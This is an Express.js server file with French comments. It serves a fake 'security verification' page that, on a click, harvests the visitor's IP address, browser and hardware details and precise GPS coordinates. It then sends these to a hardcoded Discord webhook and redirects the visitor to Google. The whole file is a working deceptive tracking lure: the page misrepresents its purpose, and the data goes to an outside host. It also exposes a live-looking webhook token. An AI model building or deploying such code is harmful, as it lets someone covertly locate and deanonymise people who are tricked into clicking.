const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Remplacer par l'URL exacte du Webhook Discord
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546990311144689736/JNIn6Zl1Dr3ep-Kvm6uwz_HHDfS8vco5ThkHLWGgkMHQOvIph6DdGUd10V3YjbEOndBE";

app.use(express.json());

// Page principale avec collecte automatique des métadonnées navigateur
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Vérification système</title>
            <style>
                body { font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0f172a; color: #f8fafc; margin: 0; }
                .card { background: #1e293b; padding: 2rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: center; max-width: 400px; width: 90%; }
                button { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; width: 100%; }
                button:hover { background: #2563eb; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>Vérification de sécurité</h2>
                <p>Cliquez ci-dessous pour vérifier votre configuration.</p>
                <button onclick="lancerCollecte()">Continuer</button>
            </div>

            <script>
                // Recueil des informations client accessibles sans permission
                function obtenirMetadonneesClient() {
                    return {
                        ecran: screen.width + 'x' + screen.height,
                        profondeurCouleur: screen.colorDepth + ' bits',
                        fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        coeursCPU: navigator.hardwareConcurrency || 'Inconnu',
                        ramGo: navigator.deviceMemory ? navigator.deviceMemory + ' Go' : 'Inconnu',
                        langue: navigator.language || 'Inconnue',
                        plateforme: navigator.platform || 'Inconnue'
                    };
                }

                function envoyerRapport(donneesGps) {
                    const payload = {
                        client: obtenirMetadonneesClient(),
                        gps: donneesGps || null
                    };

                    fetch('/api/collecte', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    }).then(() => {
                        window.location.href = "https://www.google.com";
                    });
                }

                function lancerCollecte() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                envoyerRapport({
                                    lat: pos.coords.latitude,
                                    lon: pos.coords.longitude,
                                    precision: pos.coords.accuracy
                                });
                            },
                            (err) => {
                                envoyerRapport({ erreur: "Permission refusée ou indisponible (" + err.message + ")" });
                            },
                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                        );
                    } else {
                        envoyerRapport({ erreur: "API non supportée" });
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// Traitement des données et notification Discord
app.post('/api/collecte', async (req, res) => {
    const body = req.body || {};
    const client = body.client || {};
    const gps = body.gps || {};

    // Récupération des en-têtes réseau
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Inconnu';
    const acceptLanguage = req.headers['accept-language'] || 'Inconnu';
    const referer = req.headers['referer'] || 'Direct / Aucun';

    let gpsText = "❌ Non autorisé / Indisponible";
    if (gps.lat && gps.lon) {
        gpsText = `📍 [${gps.lat}, ${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon}) (Précision: +/- ${Math.round(gps.precision)}m)`;
    } else if (gps.erreur) {
        gpsText = `❌ ${gps.erreur}`;
    }

    const embeds = [{
        title: "📊 Nouvelles métadonnées capturées",
        color: 3447003,
        fields: [
            { name: "🌐 Réseau (HTTP)", value: `**IP :** \`${ip}\`\n**User-Agent :** \`${userAgent}\`\n**Langue (Accept-Lang) :** \`${acceptLanguage}\`\n**Referer :** \`${referer}\`` },
            { name: "💻 Environnement Client (JS)", value: `**Écran :** ${client.ecran} (${client.profondeurCouleur})\n**Fuseau Horaire :** ${client.fuseauHoraire}\n**Processeur :** ${client.coeursCPU} cœurs\n**RAM :** ${client.ramGo}\n**Langue navigateur :** ${client.langue}\n**Plateforme :** ${client.plateforme}` },
            { name: "🛰️ Géolocalisation GPS", value: gpsText }
        ],
        timestamp: new Date().toISOString()
    }];

    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds })
        });
    } catch (err) {
        console.error("Erreur Webhook Discord :", err);
    }

    res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Serveur démarré sur le port ${PORT}`));
